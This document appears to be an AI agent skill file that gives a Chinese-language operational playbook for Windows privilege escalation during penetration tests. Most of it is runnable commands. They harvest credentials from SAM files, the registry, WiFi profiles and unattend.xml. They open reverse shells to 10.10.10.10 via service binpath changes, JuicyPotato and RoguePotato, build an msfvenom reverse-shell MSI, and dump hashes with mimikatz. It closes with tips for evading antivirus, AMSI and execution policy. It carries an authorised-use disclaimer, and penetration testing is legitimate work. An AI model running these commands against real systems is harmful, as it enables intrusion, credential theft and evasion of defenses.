---
name: windows-privilege-escalation
description: "在渗透测试任务中，提供系统化的方法以发现并利用 Windows 系统上的权限提升漏洞。涵盖系统枚举、凭据收集、服务利用、令牌模拟、内核漏洞及各类错误配置。触发词：Windows权限提升、特权升级、提权、privesc、UAC绕过、令牌模拟、SeImpersonatePrivilege、JuicyPotato、PrintSpoofer、AlwaysInstallElevated、内核漏洞、渗透测试、Windows安全。"
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
---

> 仅限授权使用：本技能仅可用于获得授权的安全评估、防御性验证或受控的教学环境。

# Windows 权限提升

## 目的

在渗透测试任务中，提供系统化的方法以发现并利用 Windows 系统上的权限提升漏洞。本技能涵盖系统枚举、凭据收集、服务利用、令牌模拟、内核漏洞以及各种错误配置，使攻击者能够从标准用户提升至 Administrator 或 SYSTEM 权限。

## 输入 / 前置条件

- **初始访问**：在 Windows 系统上以标准用户身份获得 Shell 或 RDP 访问权限
- **枚举工具**：WinPEAS、PowerUp、Seatbelt 或手动命令
- **漏洞利用二进制文件**：预编译的漏洞利用程序或可传输工具的能力
- **知识储备**：理解 Windows 安全模型与权限机制
- **授权许可**：获得渗透测试活动的书面授权

## 输出 / 交付物

- **权限提升路径**：通往更高权限的已识别向量
- **凭据转储**：收集到的密码、哈希或令牌
- **提权后的 Shell**：以 Administrator 或 SYSTEM 身份执行命令
- **漏洞报告**：错误配置与漏洞利用的文档说明
- **修复建议**：针对已识别弱点的修复方案

## 核心工作流

### 1. 系统枚举

#### 基本系统信息
```powershell
# 操作系统版本与补丁
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic qfe

# 体系结构
wmic os get osarchitecture
echo %PROCESSOR_ARCHITECTURE%

# 环境变量
set
Get-ChildItem Env: | ft Key,Value

# 列出驱动器
wmic logicaldisk get caption,description,providername
```

#### 用户枚举
```powershell
# 当前用户
whoami
echo %USERNAME%

# 用户权限
whoami /priv
whoami /groups
whoami /all

# 所有用户
net user
Get-LocalUser | ft Name,Enabled,LastLogon

# 用户详细信息
net user administrator
net user %USERNAME%

# 本地组
net localgroup
net localgroup administrators
Get-LocalGroupMember Administrators | ft Name,PrincipalSource
```

#### 网络枚举
```powershell
# 网络接口
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address

# 路由表
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric

# ARP 表
arp -A

# 活动连接
netstat -ano

# 网络共享
net share

# 域控制器
nltest /DCLIST:DomainName
```

#### 杀软枚举
```powershell
# 检查 AV 产品
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
```

### 2. 凭据收集

#### SAM 与 SYSTEM 文件
```powershell
# SAM 文件位置
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM

# SYSTEM 文件位置
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system

# 提取哈希（获取文件后在 Linux 上操作）
pwdump SYSTEM SAM > sam.txt
samdump2 SYSTEM SAM -o sam.txt

# 使用 John 破解
john --format=NT sam.txt
```

#### HiveNightmare（CVE-2021-36934）
```powershell
# 检查漏洞
icacls C:\Windows\System32\config\SAM
# 如果存在以下结果则存在漏洞：BUILTIN\Users:(I)(RX)

# 使用 mimikatz 进行漏洞利用
mimikatz> token::whoami /full
mimikatz> misc::shadowcopies
mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
```

#### 搜索密码
```powershell
# 搜索文件内容
findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config

# 搜索注册表
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Windows 自动登录凭据
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"

# PuTTY 会话
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# VNC 密码
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

# 搜索特定文件
dir /S /B *pass*.txt == *pass*.xml == *cred* == *vnc* == *.config*
where /R C:\ *.ini
```

#### Unattend.xml 凭据
```powershell
# 常见位置
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml

# 搜索文件
dir /s *sysprep.inf *sysprep.xml *unattend.xml 2>nul

# 解码 base64 密码（Linux）
echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo=" | base64 -d
```

#### WiFi 密码
```powershell
# 列出配置文件
netsh wlan show profile

# 获取明文密码
netsh wlan show profile <SSID> key=clear

# 提取所有 WiFi 密码
for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Key" | find /v "Number" & echo.) & @echo on
```

#### PowerShell 历史记录
```powershell
# 查看 PowerShell 历史
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### 3. 服务利用

#### 不正确的服务权限
```powershell
# 查找错误配置的服务
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -ucqv <service_name>

# 关注：SERVICE_ALL_ACCESS、SERVICE_CHANGE_CONFIG

# 利用存在漏洞的服务
sc config <service> binpath= "C:\nc.exe -e cmd.exe 10.10.10.10 4444"
sc stop <service>
sc start <service>
```

#### 未加引号的服务路径
```powershell
# 查找未加引号的路径
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\"
wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

# 利用方法：在路径中放置恶意 exe
# 对于路径：C:\Program Files\Some App\service.exe
# 尝试：C:\Program.exe 或 C:\Program Files\Some.exe
```

#### AlwaysInstallElevated
```powershell
# 检查是否启用
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# 两者都必须返回 0x1 才存在漏洞

# 创建恶意 MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o evil.msi

# 安装（以 SYSTEM 身份运行）
msiexec /quiet /qn /i C:\evil.msi
```

### 4. 令牌模拟

#### 检查模拟权限
```powershell
# 查找以下权限
whoami /priv

# 可被利用的权限：
# SeImpersonatePrivilege
# SeAssignPrimaryTokenPrivilege
# SeTcbPrivilege
# SeBackupPrivilege
# SeRestorePrivilege
# SeCreateTokenPrivilege
# SeLoadDriverPrivilege
# SeTakeOwnershipPrivilege
# SeDebugPrivilege
```

#### Potato 攻击
```powershell
# JuicyPotato（Windows Server 2019 及以下）
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.10.10 4444 -e cmd.exe" -t *

# PrintSpoofer（Windows 10 与 Server 2019）
PrintSpoofer.exe -i -c cmd

# RoguePotato
RoguePotato.exe -r 10.10.10.10 -e "C:\nc.exe 10.10.10.10 4444 -e cmd.exe" -l 9999

# GodPotato
GodPotato.exe -cmd "cmd /c whoami"
```

### 5. 内核漏洞利用

#### 查找内核漏洞
```powershell
# 使用 Windows Exploit Suggester
systeminfo > systeminfo.txt
python wes.py systeminfo.txt

# 或者使用 Watson（在目标上执行）
Watson.exe

# 或者使用 Sherlock PowerShell 脚本
powershell.exe -ExecutionPolicy Bypass -File Sherlock.ps1
```

#### 常见的内核漏洞
```
MS17-010（EternalBlue） - Windows 7/2008/2003/XP
MS16-032 - Secondary Logon Handle - 2008/7/8/10/2012
MS15-051 - Client Copy Image - 2003/2008/7
MS14-058 - TrackPopupMenu - 2003/2008/7/8.1
MS11-080 - afd.sys - XP/2003
MS10-015 - KiTrap0D - 2003/XP/2000
MS08-067 - NetAPI - 2000/XP/2003
CVE-2021-1732 - Win32k - Windows 10/Server 2019
CVE-2020-0796 - SMBGhost - Windows 10
CVE-2019-1388 - UAC 绕过 - Windows 7/8/10/2008/2012/2016/2019
```

### 6. 其他技术

#### DLL 劫持
```powershell
# 使用 Process Monitor 查找缺失的 DLL
# 过滤条件：Result = NAME NOT FOUND，Path 以 .dll 结尾

# 编译恶意 DLL
# 对于 x64：x86_64-w64-mingw32-gcc windows_dll.c -shared -o evil.dll
# 对于 x86：i686-w64-mingw32-gcc windows_dll.c -shared -o evil.dll
```

#### 使用已保存凭据的 Runas
```powershell
# 列出已保存的凭据
cmdkey /list

# 使用已保存的凭据
runas /savecred /user:Administrator "cmd.exe /k whoami"
runas /savecred /user:WORKGROUP\Administrator "\\10.10.10.10\share\evil.exe"
```

#### WSL 利用
```powershell
# 检查是否存在 WSL
wsl whoami

# 将 root 设为默认用户
wsl --default-user root
# 或：ubuntu.exe config --default-user root

# 以 root 身份派生 shell
wsl whoami
wsl python -c 'import os; os.system("/bin/bash")'
```

## 快速参考

### 枚举工具

| 工具 | 命令 | 用途 |
|------|---------|---------|
| WinPEAS | `winPEAS.exe` | 全面枚举 |
| PowerUp | `Invoke-AllChecks` | 服务/路径漏洞 |
| Seatbelt | `Seatbelt.exe -group=all` | 安全审计检查 |
| Watson | `Watson.exe` | 缺失的补丁 |
| JAWS | `.\jaws-enum.ps1` | 旧版 Windows 枚举 |
| PrivescCheck | `Invoke-PrivescCheck` | 权限提升检查 |

### 默认可写文件夹

```
C:\Windows\Temp
C:\Windows\Tasks
C:\Users\Public
C:\Windows\tracing
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
```

### 常见权限提升向量

| 向量 | 检查命令 |
|--------|---------------|
| 未加引号的路径 | `wmic service get pathname \| findstr /i /v """` |
| 弱服务权限 | `accesschk.exe -uwcqv "Everyone" *` |
| AlwaysInstallElevated | `reg query HKCU\...\Installer /v AlwaysInstallElevated` |
| 已存储的凭据 | `cmdkey /list` |
| 令牌权限 | `whoami /priv` |
| 计划任务 | `schtasks /query /fo LIST /v` |

### 模拟权限利用

| 权限 | 工具 | 用法 |
|-----------|------|-------|
| SeImpersonatePrivilege | JuicyPotato | CLSID 滥用 |
| SeImpersonatePrivilege | PrintSpoofer | Spooler 服务 |
| SeImpersonatePrivilege | RoguePotato | OXID 解析器 |
| SeBackupPrivilege | robocopy /b | 读取受保护文件 |
| SeRestorePrivilege | Enable-SeRestorePrivilege | 写入受保护文件 |
| SeTakeOwnershipPrivilege | takeown.exe | 获取文件所有权 |

## 约束与限制

### 操作边界
- 内核漏洞利用可能导致系统不稳定
- 某些漏洞利用需要特定 Windows 版本
- AV/EDR 可能检测并阻止常见工具
- 令牌模拟需要服务账户上下文
- 某些技术需要 GUI 访问

### 检测注意事项
- 凭据转储会触发安全告警
- 服务修改会被记录在事件日志中
- PowerShell 执行可能被监控
- 已知漏洞利用签名会被 AV 检测到

### 法律要求
- 仅在获得书面授权的系统上进行测试
- 记录所有权限提升尝试
- 避免干扰生产系统
- 通过正式渠道报告所有发现

## 示例

### 示例 1：服务二进制路径利用
```powershell
# 查找存在漏洞的服务
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
# 结果：RW MyService SERVICE_ALL_ACCESS

# 查看当前配置
sc qc MyService

# 停止服务并修改二进制路径
sc stop MyService
sc config MyService binpath= "C:\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
sc start MyService

# 接收 SYSTEM shell
```

### 示例 2：AlwaysInstallElevated 利用
```powershell
# 验证漏洞
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 两者均返回：0x1

# 生成 payload（攻击者机器）
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o shell.msi

# 传输并执行
msiexec /quiet /qn /i C:\Users\Public\shell.msi

# 接收 SYSTEM shell
```

### 示例 3：JuicyPotato 令牌模拟
```powershell
# 验证 SeImpersonatePrivilege
whoami /priv
# SeImpersonatePrivilege Enabled

# 运行 JuicyPotato
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc.exe 10.10.10.10 4444 -e cmd.exe" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}

# 接收 SYSTEM shell
```

### 示例 4：未加引号的服务路径
```powershell
# 查找未加引号的路径
wmic service get name,pathname | findstr /i /v """
# 结果：C:\Program Files\Vuln App\service.exe

# 检查写权限
icacls "C:\Program Files\Vuln App"
# 结果：Users:(W)

# 放置恶意二进制
copy C:\Users\Public\shell.exe "C:\Program Files\Vuln.exe"

# 重启服务
sc stop "Vuln App"
sc start "Vuln App"
```

### 示例 5：从注册表收集凭据
```powershell
# 检查自动登录凭据
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
# DefaultUserName: Administrator
# DefaultPassword: P@ssw0rd123

# 使用凭据
runas /user:Administrator cmd.exe
# 或者用于远程：psexec \\target -u Administrator -p P@ssw0rd123 cmd
```

## 故障排查

| 问题 | 原因 | 解决方案 |
|-------|-------|----------|
| 漏洞利用失败（被 AV 检测到） | AV 阻止已知漏洞 | 使用混淆后的漏洞利用；living-off-the-land（mshta、certutil）；自定义编译二进制 |
| 服务无法启动 | 二进制路径语法错误 | 确保 `=` 后有空格：`binpath= "C:\path\binary.exe"` |
| 令牌模拟失败 | 权限/版本错误 | 检查 `whoami /priv`；确认 Windows 版本兼容性 |
| 找不到内核漏洞 | 系统已打补丁 | 运行 Windows Exploit Suggester：`python wes.py systeminfo.txt` |
| PowerShell 被阻止 | 执行策略/AMSI | 使用 `powershell -ep bypass -c "cmd"` 或 `-enc <base64>` |

## 何时使用
本技能适用于执行概述中所述的工作流或操作。
